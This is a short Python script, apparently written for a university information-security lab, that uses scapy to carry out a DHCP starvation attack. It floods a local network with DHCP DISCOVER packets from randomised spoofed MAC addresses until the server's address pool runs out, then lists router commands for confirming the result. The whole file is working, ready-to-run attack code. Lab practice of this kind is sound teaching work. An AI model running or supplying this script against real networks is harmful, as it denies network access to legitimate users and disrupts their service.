#!/usr/bin/env python3
"""
DHCP Starvation Attack
Práctica Seguridad de la Información - ITLA
Matrícula: 20250730

Requisitos: pip install scapy
Uso: sudo python3 dhcp_starvation.py
"""

from scapy.all import *
import random
import time

IFACE   = 'eth0'   # Cambiar según interfaz
COUNT   = 60       # Número de solicitudes (pool VLAN10 = /26 = 62 hosts)
DELAY   = 0.1      # Segundos entre paquetes

def rand_mac():
    return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])

def dhcp_discover(mac):
    return (
        Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
        IP(src='0.0.0.0', dst='255.255.255.255') /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=bytes.fromhex(mac.replace(':', '')), xid=random.randint(1, 0xFFFFFF)) /
        DHCP(options=[('message-type', 'discover'), 'end'])
    )

print('[*] Iniciando DHCP Starvation...')
print(f'[*] Enviando {COUNT} solicitudes DHCP DISCOVER')
print(f'[*] Interfaz: {IFACE}')
print()

for i in range(COUNT):
    mac = rand_mac()
    pkt = dhcp_discover(mac)
    sendp(pkt, iface=IFACE, verbose=0)
    print(f'[{i+1:03d}/{COUNT}] DISCOVER enviado desde MAC: {mac}')
    time.sleep(DELAY)

print()
print('[+] Ataque completado. Pool DHCP posiblemente agotado.')
print('[+] Verificar en router: show ip dhcp binding')
print('[+] Verificar en router: show ip dhcp pool')
